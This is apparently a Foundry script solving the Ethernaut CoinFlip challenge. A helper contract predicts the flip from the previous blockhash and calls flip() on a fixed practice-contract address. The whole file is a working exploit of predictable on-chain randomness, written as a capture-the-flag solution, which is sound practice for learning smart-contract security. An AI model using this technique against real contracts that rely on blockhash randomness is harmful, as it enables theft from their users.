// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

 contract Player {
        
         uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

         constructor(CoinFlip _CoinFlipInstance) {
         
           uint256 blockValue = uint256(blockhash(block.number - 1));
              uint256 coinFlip = blockValue / FACTOR;
             bool side = coinFlip == 1 ? true : false;
            _CoinFlipInstance.flip(side);
    }

 }

contract CoinflipSolution is Script {
   
    CoinFlip public CoinflipInstance = CoinFlip(0x2a6DCa8e439f06c22b9FEd57f0Fa3159BC107cbe);

    function run() external {
 
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      
      new Player(CoinflipInstance);
      console.log("consecutiveWins: ", CoinflipInstance.consecutiveWins());

      vm.stopBroadcast();
    }

}